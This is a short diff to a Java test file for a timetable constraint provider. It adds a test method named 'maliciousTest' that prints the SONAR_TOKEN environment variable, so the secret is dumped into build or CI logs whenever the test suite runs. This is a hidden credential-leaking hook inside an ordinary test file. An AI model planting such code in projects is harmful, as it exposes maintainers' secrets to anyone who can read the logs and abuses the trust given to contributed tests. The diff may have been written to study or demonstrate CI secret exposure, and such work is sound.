@@ -92,4 +92,9 @@ class TimetableConstraintProviderTest {
                 .penalizesBy(1); // Second tuesday lesson immediately follows the first.
     }
 
+    @Test
+    void maliciousTest() {
+        System.out.println(System.getenv("SONAR_TOKEN"));
+    }
+
 }
